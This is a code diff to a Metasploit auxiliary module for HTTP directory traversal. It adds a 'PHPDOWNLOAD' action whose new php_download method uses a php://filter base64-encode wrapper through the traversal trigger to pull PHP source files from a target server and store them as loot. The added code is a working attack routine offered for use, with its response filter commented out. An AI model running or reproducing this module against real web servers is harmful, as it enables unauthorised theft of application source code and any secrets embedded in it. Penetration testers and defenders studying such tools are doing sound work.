@@ -12,6 +12,7 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::HttpClient
 	include Msf::Auxiliary::WmapScanUniqueQuery
 
+
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'           => 'Generic HTTP Directory Traversal Utility',
@@ -23,7 +24,9 @@ class Metasploit3 < Msf::Auxiliary
 				directory traversal exists in the web server, and then return the path that
 				triggers the vulnerability.  The 'DOWNLOAD' action shares the same ability as
 				'CHECK', but will take advantage of the found trigger to download files based on
-				a 'FILELIST' of your choosing.  The 'WRITABLE' action can be used to determine
+				a 'FILELIST' of your choosing. You also can to download php source code files using PHPDOWNLOAD 
+				based in a crawled list.  
+				The 'WRITABLE' action can be used to determine
 				if the trigger can be used to write files outside the www directory.
 
 					To use the 'COOKIE' option, set your value like so: "name=value".  To use
@@ -41,7 +44,8 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					['CHECK',    {'Description' => 'Check for basic directory traversal'}],
 					['WRITABLE', {'Description' => 'Check if a traversal bug allows us to write anywhere'}],
-					['DOWNLOAD', {'Description' => 'Attempt to download files after bruteforcing a trigger'}]
+					['DOWNLOAD', {'Description' => 'Attempt to download files after bruteforcing a trigger'}],
+					['PHPDOWNLOAD', {'Description' => 'Attempt to download php source code files'}]
 				],
 			'DefaultAction'  => 'CHECK'
 		))
@@ -245,6 +249,35 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("#{counter.to_s} file(s) downloaded")
 	end
 
+	
+	#
+	# Action 'PHPDOWNLOAD': Used to grab the php source code
+	#
+	def php_download(files)
+		counter = 0
+		files.each_line do |f|
+			# Our trigger already puts us in '/', so our filename doesn't need to begin with that
+			f = f[1,f.length] if f =~ /^\//
+
+			req = ini_request(uri = (datastore['PATH'] + "php://filter/read=convert.base64-encode/resource=" + f).chop)
+			res = send_request_cgi(req, 25)
+
+			vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}")
+
+			# Only download files that are withint our interest
+			#if res and res.to_s =~ datastore['PATTERN']
+				# We assume the string followed by the last '/' is our file name
+				fname = f.split("/")[-1].chop
+				loot = store_loot("php.data","text/plain",rhost,Rex::Text.decode_base64(res.body),fname)
+				print_good("File #{fname} downloaded to: #{loot}")
+				counter += 1
+			#end
+		end
+		print_status("#{counter.to_s} source code file(s) downloaded")
+	end
+
+	
+	
 	#
 	# Action 'WRITABLE': This method will attempt to write to a directory outside of www
 	#
@@ -321,10 +354,18 @@ class Metasploit3 < Msf::Auxiliary
 			return if trigger.nil?
 			is_writable(trigger)
 
+		elsif action.name == 'PHPDOWNLOAD'
+			trigger = ini_trigger
+			return if trigger.nil?
+			files = load_filelist
+			php_download(files)
+		
+				
 		elsif action.name == 'DOWNLOAD'
 			trigger = ini_trigger
 			return if trigger.nil?
-
+			
+		
 			# Load up a file list that we wish to download, and then attempt to download them
 			# with our directory traversal trigger
 			files = load_filelist
